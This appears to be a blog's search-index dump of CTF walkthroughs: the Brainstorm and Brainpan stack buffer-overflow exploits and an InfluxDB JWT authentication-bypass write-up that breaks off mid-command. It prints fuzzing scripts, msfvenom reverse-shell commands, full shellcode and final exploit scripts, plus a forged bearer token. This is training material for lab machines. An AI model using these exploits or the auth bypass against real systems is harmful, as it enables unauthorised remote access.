in gaining code execution on the target machine?We can search loaded modules with disabled security protections for some specific instructions. With ERC.Xdbg, we can list of all loaded files by the program:ERC --ModuleInfo -NXCompatWe will only consider files with False set to all protections which gives us the following list:------------------------------------------------------------------------------------------------------------------------ Base | Entry point | Size | Rebase | SafeSEH | ASLR | NXCompat | OS DLL | Version, Name, and Path ------------------------------------------------------------------------------------------------------------------------ 0x400000 0x14e0 0x9000 False False False False False C:\\Users\\user\\Desktop\\brainstorm\\chatserver.exe 0x62500000 0x1420 0xb000 False False False False False C:\\Users\\user\\Desktop\\brainstorm\\essfunc.dllNow go the Symbols tab, and double click on the module you’re interested in:Directly into the stack, we will place instructions that will give us a reverse shell when executed (in the form of machine code/shellcode) and write into EIP the address of the beginning of our payload.There are various ways to do that: using ESP address (but the real target may have a different address 🙃) using JMP ESP ➡️ jumps to the top of the stack and continues the execution (more reliable) using CALL RSP (also jump to the stack) using PUSH ESP; RET (requires to search for machine code patterns in x32dbg) etc.Type Ctrl+f and look for JMP ESP:⚠️ We must ensure that the instruction address does not contain any bad characters ⚠️0x625014DF seems a good candidate!Jumping to shell codeWe got everything to exploit our program: we calculated the offset (2012) we identified all bad characters (there were none, except 0x00) we found a JMP ESP instruction (0x625014DF) we can generate a shell code with msfvenom:$ msfvenom -p &#39;windows/shell_reverse_tcp&#39; LHOST=$(vpnip) LPORT=443 -f &#39;python&#39; --bad-chars=&quot;\\x00&quot; --var-name shellcode[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 351 (iteration=0)x86/shikata_ga_nai chosen with final size 351Payload size: 351 bytesFinal size of python file: 1965 bytes...Before adding this shellcode to our exploit script, we need to prepend it with NOP (No Operation) bytes (machine code 0x90). This is to prevent some issues with Stack Frame and Stack Alignment.In fact, by the time our JMP ESP instruction is executed, ESP (top of the stack) may have moved slightly and the first few bytes of our shell code may get skipped, which will lead failing the exploitation.Adding 32 bytes of NOP before our shell code should guarantee that the execution starts somewhere within these bytes, and continue to execute our main shell code.def exploit(): # msfvenom -p &#39;windows/shell_reverse_tcp&#39; LHOST=$(vpnip) LPORT=443 -f &#39;python&#39; --bad-chars=&quot;\\x00&quot; --var-name shellcode shellcode = b&quot;&quot; shellcode += b&quot;\\xbd\\xad\\xe4\\xf5\\xa1\\xdb\\xce\\xd9\\x74\\x24\\xf4&quot; shellcode += b&quot;\\x5b\\x2b\\xc9\\xb1\\x52\\x31\\x6b\\x12\\x03\\x6b\\x12&quot; shellcode += b&quot;\\x83\\x46\\x18\\x17\\x54\\x64\\x09\\x5a\\x97\\x94\\xca&quot; shellcode += b&quot;\\x3b\\x11\\x71\\xfb\\x7b\\x45\\xf2\\xac\\x4b\\x0d\\x56&quot; shellcode += b&quot;\\x41\\x27\\x43\\x42\\xd2\\x45\\x4c\\x65\\x53\\xe3\\xaa&quot; shellcode += b&quot;\\x48\\x64\\x58\\x8e\\xcb\\xe6\\xa3\\xc3\\x2b\\xd6\\x6b&quot; shellcode += b&quot;\\x16\\x2a\\x1f\\x91\\xdb\\x7e\\xc8\\xdd\\x4e\\x6e\\x7d&quot; shellcode += b&quot;\\xab\\x52\\x05\\xcd\\x3d\\xd3\\xfa\\x86\\x3c\\xf2\\xad&quot; shellcode += b&quot;\\x9d\\x66\\xd4\\x4c\\x71\\x13\\x5d\\x56\\x96\\x1e\\x17&quot; shellcode += b&quot;\\xed\\x6c\\xd4\\xa6\\x27\\xbd\\x15\\x04\\x06\\x71\\xe4&quot; shellcode += b&quot;\\x54\\x4f\\xb6\\x17\\x23\\xb9\\xc4\\xaa\\x34\\x7e\\xb6&quot; shellcode += b&quot;\\x70\\xb0\\x64\\x10\\xf2\\x62\\x40\\xa0\\xd7\\xf5\\x03&quot; shellcode += b&quot;\\xae\\x9c\\x72\\x4b\\xb3\\x23\\x56\\xe0\\xcf\\xa8\\x59&quot; shellcode += b&quot;\\x26\\x46\\xea\\x7d\\xe2\\x02\\xa8\\x1c\\xb3\\xee\\x1f&quot; shellcode += b&quot;\\x20\\xa3\\x50\\xff\\x84\\xa8\\x7d\\x14\\xb5\\xf3\\xe9&quot; shellcode += b&quot;\\xd9\\xf4\\x0b\\xea\\x75\\x8e\\x78\\xd8\\xda\\x24\\x16&quot; shellcode += b&quot;\\x50\\x92\\xe2\\xe1\\x97\\x89\\x53\\x7d\\x66\\x32\\xa4&quot; shellcode += b&quot;\\x54\\xad\\x66\\xf4\\xce\\x04\\x07\\x9f\\x0e\\xa8\\xd2&quot; shellcode += b&quot;\\x30\\x5e\\x06\\x8d\\xf0\\x0e\\xe6\\x7d\\x99\\x44\\xe9&quot; shellcode += b&quot;\\xa2\\xb9\\x67\\x23\\xcb\\x50\\x92\\xa4\\xfe\\xaf\\xbf&quot; shellcode += b&quot;\\xa7\\x97\\xad\\xbf\\xc6\\xdc\\x3b\\x59\\xa2\\x32\\x6a&quot; shellcode += b&quot;\\xf2\\x5b\\xaa\\x37\\x88\\xfa\\x33\\xe2\\xf5\\x3d\\xbf&quot; shellcode += b&quot;\\x01\\x0a\\xf3\\x48\\x6f\\x18\\x64\\xb9\\x3a\\x42\\x23&quot; shellcode += b&quot;\\xc6\\x90\\xea\\xaf\\x55\\x7f\\xea\\xa6\\x45\\x28\\xbd&quot; shellcode += b&quot;\\xef\\xb8\\x21\\x2b\\x02\\xe2\\x9b\\x49\\xdf\\x72\\xe3&quot; shellcode += b&quot;\\xc9\\x04\\x47\\xea\\xd0\\xc9\\xf3\\xc8\\xc2\\x17\\xfb&quot; shellcode += b&quot;\\x54\\xb6\\xc7\\xaa\\x02\\x60\\xae\\x04\\xe5\\xda\\x78&quot; shellcode += b&quot;\\xfa\\xaf\\x8a\\xfd\\x30\\x70\\xcc\\x01\\x1d\\x06\\x30&quot; shellcode += b&quot;\\xb3\\xc8\\x5f\\x4f\\x7c\\x9d\\x57\\x28\\x60\\x3d\\x97&quot; shellcode += b&quot;\\xe3\\x20\\x4d\\xd2\\xa9\\x01\\xc6\\xbb\\x38\\x10\\x8b&quot; shellcode += b&quot;\\x3b\\x97\\x57\\xb2\\xbf\\x1d\\x28\\x41\\xdf\\x54\\x2d&quot; shellcode += b&quot;\\x0d\\x67\\x85\\x5f\\x1e\\x02\\xa9\\xcc\\x1f\\x07&quot; buffer = b&quot;A&quot; * OFFSET eip = pack(&quot;&amp;lt;L&quot;, 0x625014DF) # jmp_esp nop = b&quot;\\x90&quot; * 32 payload = buffer + eip + nop + shellcode send_payload(payload)Now we have to replace the IP address of the target, we execute our script again and we got a shell as system:Useful links The Cyber Mentor - Brainstorm Stack-Based Buffer Overflows on Windows x86 x64dbg documentation ERC documentation" }, { "title": "TryHackMe/Vulnhub - Brainpan", "url": "/thm-brainpan/", "categories": "TryHackMe walkthroughs, Linux", "tags": "thm-linux, writeup, oscp-prep, dirb, PE32, buffer overflow, pwn, pattern_create.rb, pattern_offset.rb, mona.py, Immunity Debugger, wine, ollydbg, jmp esp, fuzzing, msfvenom, shellcode, sudo misconfiguration, GTFOBins", "date": "2021-08-02 23:50:19 +0700", "snippet": "Originally posted on Vulnhub by superkojiman, Brainpan is a vulnerable machine, highly recommended to complete before taking the OSCP exam due to the buffer overflow vulnerability that has to exploited.The vulnerable program is a Windows executable.We will analyze and exploit it from our Kali Linux machine.Enumerationnmap scannmap reveals two open ports:$ nmap -min-rate 5000 --max-retries 1 -sV -oN brainpan.txt 10.10.92.146Nmap scan report for 10.10.92.146Host is up (0.037s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION9999/tcp open abyss?10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3)I couldn’t figure out which OS is running on the target machine using nmap -O so I pinged it and I assumed it was a Linux server because of the TTL value (See default TTL (Time To Live) values of different OS):$ ping -c3 10.10.92.146PING 10.10.92.146 (10.10.92.146) 56(84) bytes of data.64 bytes from 10.10.92.146: icmp_seq=1 ttl=63 time=37.7 ms64 bytes from 10.10.92.146: icmp_seq=2 ttl=63 time=37.6 ms64 bytes from 10.10.92.146: icmp_seq=3 ttl=63 time=37.2 ms--- 10.10.92.146 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 2004msrtt min/avg/max/mdev = 37.203/37.503/37.704/0.216 msPort 9999 (Brainpan)Port 10000 (SimpleHTTPServer)dirb can help us to find a /bin directory on the web page:$ dirb http://$TARGET:10000 -o services/10000-http.txt-----------------DIRB v2.22 By The Dark Raver-----------------OUTPUT_FILE: services/10000-http.txtSTART_TIME: Sun Aug 1 18:09:55 2021URL_BASE: http://10.10.92.146:10000/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.92.146:10000/ ----+ http://10.10.92.146:10000/bin (CODE:301|SIZE:0) + http://10.10.92.146:10000/index.html (CODE:200|SIZE:215) -----------------END_TIME: Sun Aug 1 18:15:39 2021DOWNLOADED: 4612 - FOUND: 2An executable called brainpan.exe can be downloaded from here:Using file tells us this a 32-bit Windows program:$ file brainpan.exe brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS WindowsExploitationThis executable is the same as the one on the port 9999 of the target machine.In order to run it from our Kali Linux machine, we’ll be using wine:Step 1: FuzzingThe program is waiting for password from the user input.During this first step called “fuzzing”, we’ll be sending a bunch of characters in order to crash the program. This will potentially reveals a buffer overflow vulnerability.I used the following script to do so:import socketimport timeimport sysbuffer = b&quot;A&quot; * 100target = &#39;127.0.0.1&#39;port = 9999while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target, port)) s.send((b&quot; &amp;gt;&amp;gt; &quot; + buffer)) s.close() time.sleep(1) buffer = buffer + b&quot;A&quot; * 100 except: print(f&quot;Fuzzing crashed at {len(buffer)} bytes...&quot;) sys.exit(1)As we can see from the screenshots above, the program tried to access to the address 0x41414141 and crashed.This means we successfully overwrite EIP and the program crashed after copying 529 bytes to the buffer. Since 0x41414141 is just the hexadecimal representation of 0xAAAA.Step 2: Finding the offsetNow, we want to know: how much characters do we need at least to crash the program?This amount is called the offset. In order to find it, we can rely on two Metasploit scripts (called pattern_create.rb and pattern_offset.rb) or simply go manually.Method#1: pattern_create + pattern_offset We create a pattern of 529 characters with pattern_create.rb:$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 529 &amp;gt; pattern.txt We send this pattern to our wine local instance of brainpan.exe:import socketimport timetarget = &#39;127.0.0.1&#39;port = 9999with open(&quot;pattern.txt&quot;) as f: buffer = f.read().strip().encode()s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((target, port))s.send((b&quot; &amp;gt;&amp;gt; &quot; + buffer))s.close() We inspect the value of EIP: We give this value to pattern_offset.rb to compute the exact number of characters needed to crash the program:$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41357141[*] Exact match at offset 495Method#2: manuallySince I saw the message “529 bytes copied to buffer” on the debug console, I tried many values (525, 500, …) until I found 495 was the exact offset.import socketimport timeimport sysoffset = 495buffer = b&quot;A&quot; * offset + b&quot;B&quot; * 4target = &#39;127.0.0.1&#39;port = 9999s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((target, port))s.send((b&quot; &amp;gt;&amp;gt; &quot; + buffer))s.close()By placing BBBB at the end of my payload, I thought: “I will find the offset after EIP’s value will be 42424242“:Step 3: Identifying bad characters (ollydbg)In order to generate a shellcode that will work, we have to identify the bad characters first:import socketimport timeimport sys# \\x00badchars = b&quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff&quot;offset = 495buffer = b&quot;A&quot; * offset + b&quot;B&quot; * 4 + badcharstarget = &#39;127.0.0.1&#39;port = 9999s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((target, port))s.send((b&quot; &amp;gt;&amp;gt; &quot; + buffer))s.close()To inspect the program’s memory I attached the brainpan process to ollydbg on my Kali machine as follows:All the characters are here (there are no bad characters):Step 4: Finding JMP ESPBefore continuing, we need to find a jmp esp instruction to redirect the execution flow at the start of our payload/shellcode. Why JMP ESP instead of directly jumping into the stack?Using ollydbg, I found the following address:However, to ensure it was the correct address I ran brainpan.exe on a Windows VM and inspected it using Immunity Debugger and mona.py (as explained on this video):The address I got was 0x311712F3.Step 5: Generating shellcodeTo generate a shellcode we can use msfvenom:$ msfvenom -p linux/x86/shell_reverse_tcp lhost=$(vpnip) lport=4444 --format python --bad-chars &quot;\\x00&quot; --var-name shellcode[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 95 (iteration=0)x86/shikata_ga_nai chosen with final size 95Payload size: 95 bytesFinal size of python file: 550 bytesshellcode = b&quot;&quot;shellcode += b&quot;\\xba\\x9d\\x29\\x7f\\xfa\\xdd\\xc4\\xd9\\x74\\x24\\xf4&quot;shellcode += b&quot;\\x58\\x33\\xc9\\xb1\\x12\\x31\\x50\\x12\\x03\\x50\\x12&quot;shellcode += b&quot;\\x83\\x75\\xd5\\x9d\\x0f\\xb4\\xfd\\x95\\x13\\xe5\\x42&quot;shellcode += b&quot;\\x09\\xbe\\x0b\\xcc\\x4c\\x8e\\x6d\\x03\\x0e\\x7c\\x28&quot;shellcode += b&quot;\\x2b\\x30\\x4e\\x4a\\x02\\x36\\xa9\\x22\\x9f\\xc3\\x6a&quot;shellcode += b&quot;\\x21\\xf7\\xd1\\x6c\\x54\\x54\\x5f\\x8d\\xe6\\x02\\x0f&quot;shellcode += b&quot;\\x1f\\x55\\x78\\xac\\x16\\xb8\\xb3\\x33\\x7a\\x52\\x22&quot;shellcode += b&quot;\\x1b\\x08\\xca\\xd2\\x4c\\xc1\\x68\\x4a\\x1a\\xfe\\x3e&quot;shellcode += b&quot;\\xdf\\x95\\xe0\\x0e\\xd4\\x68\\x62&quot; Note: First I thought the target was a Windows machine and I used a windows/shell_reverse_tcp payload. Surprisingly, it worked and I got a Windows shell (Z:\\home\\puck&amp;gt;)…very weird! (need to figure out)Step 6: Writing final exploitimport socketimport pwnshellcode = b&quot;&quot;shellcode += b&quot;\\xba\\x9d\\x29\\x7f\\xfa\\xdd\\xc4\\xd9\\x74\\x24\\xf4&quot;shellcode += b&quot;\\x58\\x33\\xc9\\xb1\\x12\\x31\\x50\\x12\\x03\\x50\\x12&quot;shellcode += b&quot;\\x83\\x75\\xd5\\x9d\\x0f\\xb4\\xfd\\x95\\x13\\xe5\\x42&quot;shellcode += b&quot;\\x09\\xbe\\x0b\\xcc\\x4c\\x8e\\x6d\\x03\\x0e\\x7c\\x28&quot;shellcode += b&quot;\\x2b\\x30\\x4e\\x4a\\x02\\x36\\xa9\\x22\\x9f\\xc3\\x6a&quot;shellcode += b&quot;\\x21\\xf7\\xd1\\x6c\\x54\\x54\\x5f\\x8d\\xe6\\x02\\x0f&quot;shellcode += b&quot;\\x1f\\x55\\x78\\xac\\x16\\xb8\\xb3\\x33\\x7a\\x52\\x22&quot;shellcode += b&quot;\\x1b\\x08\\xca\\xd2\\x4c\\xc1\\x68\\x4a\\x1a\\xfe\\x3e&quot;shellcode += b&quot;\\xdf\\x95\\xe0\\x0e\\xd4\\x68\\x62&quot;jmp_esp = 0x311712F3 #0x7BCCE5D9offset = 495buffer = b&quot;A&quot; * offset + pwn.p32(jmp_esp) + b&quot;\\x90&quot; * 32 + shellcodetarget = &#39;10.10.92.146&#39;#target = &#39;127.0.0.1&#39;port = 9999try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target, port)) s.send((b&quot; &amp;gt;&amp;gt; &quot; + buffer)) s.close()except: print(f&quot;Error connecting to the server...&quot;)And we got a shell as puck:PrivescUpgrade shellInspecting /homeUpload LinpeasWith the program that we can run with sudo, we can open manual pages.The program certainly rely on the man command so I looked for GTFOBins man and this is what I found:Indeed, it worked, we own root:Useful resources The Cyber Mentor - Buffer Overflows Made Easy Immunity Debugger Mona.py GTFOBins - man" }, { "title": "Sweettooth Inc Writeup", "url": "/SweettoothINC-Writeup/", "categories": "tryhackme", "tags": "tryhackme, writeup, sweettoothinc", "date": "2021-08-02 09:00:00 +0700", "snippet": "With this writeup I decided to not do it with screenshots but rather code snippets. It does look a bit messy. I think next time I will stick to screenshots too.With this challenge we had to answer some questions while getting the user.txt and root.txt flags.TASK 2 - Enumeration Do a TCP portscan. What is the name of the database software running on one of these ports?I kicked off a RustScan and passed NMAP through it.rustscan -a 10.10.243.165 --ulimit 5000 -- -A -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Real hackers hack time ⌛[~] The config file is expected to be at &quot;/home/mooncake/.rustscan.toml&quot;[~] Automatically increasing ulimit value to 5000.Open 10.10.243.165:111Open 10.10.243.165:2222Open 10.10.243.165:8086Open 10.10.243.165:47330[~] Starting Script(s)[&amp;gt;] Script to be run Some(&quot;nmap -vvv -p &quot;)[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 22:02 SASTNSE: Loaded 153 scripts for scanning.NSE: Script Pre-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.00s elapsedInitiating Ping Scan at 22:02Scanning 10.10.243.165 [2 ports]Completed Ping Scan at 22:02, 0.16s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 22:02Completed Parallel DNS resolution of 1 host. at 22:02, 0.02s elapsedDNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating Connect Scan at 22:02Scanning 10.10.243.165 [4 ports]Discovered open port 111/tcp on 10.10.243.165Discovered open port 8086/tcp on 10.10.243.165Discovered open port 47330/tcp on 10.10.243.165Discovered open port 2222/tcp on 10.10.243.165Completed Connect Scan at 22:02, 0.16s elapsed (4 total ports)Initiating Service scan at 22:02Scanning 4 services on 10.10.243.165Completed Service scan at 22:02, 12.47s elapsed (4 services on 1 host)NSE: Script scanning 10.10.243.165.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 5.27s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.71s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.00s elapsedNmap scan report for 10.10.243.165Host is up, received conn-refused (0.16s latency).Scanned at 2021-07-27 22:02:34 SAST for 19sPORT STATE SERVICE REASON VERSION111/tcp open rpcbind syn-ack 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 35234/udp6 status| 100024 1 39716/tcp6 status| 100024 1 45434/udp status|_ 100024 1 47330/tcp status2222/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)| ssh-hostkey: | 1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)| ssh-dss AAAAB3NzaC1kc3MAAACBALOlP9Bx9VQxs4JDY8vovlJp+l+pPX2MGttzN2gGNYABXAVSF9CA14OituA5tcJd5/Nv3Ru3Xyu8Yo5SV0d82rd7L/NF5Relx+iiVF+bigo329wbV3wsIrRQGUYHXiMjAs8WqQR+XKjOm3q4QLVxe/jU1I1ddy6/xO4fL7nOSh3RAAAAFQDKuQDe9pQtmnqvJkZ7QuCGm31+vQAAAIBENh/MS3oHvz1tCC4nZYwdAYZMBj2It0gYCMvD0oSkqL9IMaP9DIt/5G3D9ARrZPeSP4CqhfryIGHS7t59RNdnc3ukEsfJPo23bPBwWdIW7HXp9XDqyY1kD6L3Tq0bpeXpeXt6FQ93rFxncZngFkCrMD4+YytS532qPHMPOWh75gAAAIA7TohVech8kWTh6KIMl2Y61s9cwUqwrTkqJIYMdZ73nP69FD0bw08vyrdAwtVnsqRaNzsVVz9sBOOz3wmp/ZNI5NiuyA0UwEcxPj5k6jCn620gBpMEzVy6a8Ih3yRYHoiVMrQ/PIuoeIGxeYGckCorv8jSz2O3pq1Fnz23FRPH2A==| 2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbBmLBPg9mxkAdEbJGnz0v6Jzo4qdBcajkaIBKewKyz6OQTvyhVcDReSB2Dz0nl4mPCs3UN58hSNStCYXjZcpIBpqz2pHupVlqQ7u41Vo2W8u0nVFLt2U8JhTtA9wE6MA9GhitkN3Qorhxb3klCpSnWCDdcmkdNL0EYxZV53A52VWiNGX3vYkdMAKHAmp/VHvrsIeHozqflL8vD2UIoDmxDJwgXJRsr2iGVU1fL/Bu/DwlPwJkm50ua99yPpZbvCS9EwWki76aEtZSbcM4WHzx33Oe3tLXLCfKc9CJdIW35nBvpe5Dxl7gLR/mCHp2iTpdx1FmpSf+JjO/m2vKwL4X| 256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHufHfqIZHVEKYC/yyNS+vTt35iULiIWoFNSQP/Bm/v90QzZjsYU9MSt7xdlR/2LZp9VWk32nl5JL65tvCMImxc=| 256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEYHtE8GbpGSlNB+/3IWfYRFrkJB+N9SmKs3Uh14pPj8086/tcp open http syn-ack InfluxDB http admin 1.3.0|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).47330/tcp open status syn-ack 1 (RPC #100024)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 22:02Completed NSE at 22:02, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.67 secondsFrom the scan we see the following ports open: 111 : RPC INFO 2222 : SSH 8086 : HTTP 47339 : UNKNOWNFrom port 8086 we can see that there is an InfluxDB on this port.We have the answer for the first question here.TASK 3 - Database exploration and user flagHere we get given 5 questions to answer. What is the database user you find? What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)? What is the highest rpm the motor of the mixer reached? What username do you find in one of the databases? user.txtLet us start enumerating port 8086.For this room I decided to rather use command line rather than a web browser and Burp.curl 10.10.243.165:8086404 page not foundWe get a 404. Time to see if we can find any directories or files with feroxbuster.feroxbuster -u http://10.10.243.165:8086 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.3.1───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.243.165:8086 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™──────────────────────────────────────────────────204 0l 0w 0c http://10.10.243.165:8086/status401 1l 5w 55c http://10.10.243.165:8086/query204 0l 0w 0c http://10.10.243.165:8086/ping405 1l 3w 19c http://10.10.243.165:8086/write[####################] - 1m 29999/29999 0s found:4 errors:0 [####################] - 1m 29999/29999 290/s http://10.10.243.165:8086We find two directories that don’t return anything. /status and /pingThe other two /query and /write gives us the followingcurl http://10.10.243.165:8086/query{&quot;error&quot;:&quot;unable to parse authentication credentials&quot;}curl http://10.10.243.165:8086/writeMethod Not AllowedSeems we require authentication credentials.After some research and googling, there was the following articlehttps://www.komodosec.com/post/when-all-else-fails-find-a-0-dayYou can read up on this exploit in the article but essentially we will be creating our own JWT token and with that we will be able to send queries to InfluxDBFrom the article, our first step is to get the username.curl http://10.10.243.165:8086/debug/requests {&quot;o5yY6yya:127.0.0.1&quot;: {&quot;writes&quot;:2,&quot;queries&quot;:2}}With this, we find the username for Question 1 for Task 2.Now for the JWT token.We go to https://jwt.io/This is the format of the JWT token.header - {&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWW&quot;} payload - {&quot;username&quot;:&quot;username&quot;,&quot;exp&quot;:1727388403} signature - HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),&amp;lt;leave this field empty&amp;gt;) The expiry date is in the form of epoch time.To convert the time to epoch time we can do it here - https://www.epochconverter.com/Just make sure you set the time to in the future so that the JWT token does not expire.I set mine to somewhere in 2024.It should look something like this.Now we can send queries to InfluxDB.It took a bit to understand how to query the API but eventually managed reading the following documentation - https://docs.influxdata.com/influxdb/v1.8/tools/api/We can send the following to list the databases.NOTE: I AM PIPING THE QUERY TO JQ TO MAKE THE OUTPUT MORE READABLE. YOU WILL HAVE TO INSTALL IT.curl -s &#39;http://10.10.243.165:8086/query&#39; -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ&quot; -X POST --data-urlencode &#39;q=show databases&#39; | jq{ &quot;results&quot;: [ { &quot;statement_id&quot;: 0, &quot;series&quot;: [ { &quot;name&quot;: &quot;databases&quot;, &quot;columns&quot;: [ &quot;name&quot; ], &quot;values&quot;: [ [ &quot;creds&quot; ], [ &quot;docker&quot; ], [ &quot;tanks&quot; ], [ &quot;mixer&quot; ], [ &quot;_internal&quot; ] ] } ] } ]}To query for “tables” inside the databases, instead of using show tables, like we would use with MySQL or PostgreSQL, we need to use show measurementsQuestion 2 had us look for something at an certain EPOC time. Going to https://www.epochconverter.com/ we enter the EPOC time to match the time better to answer the question and we just look at the corrospoding date and we get the temperature.It can be found with the following query on the tanks database, in the water_tank bucket.curl -s &#39;http://10.10.243.165:8086/query&#39; -H &quot;Authorization: Bearer 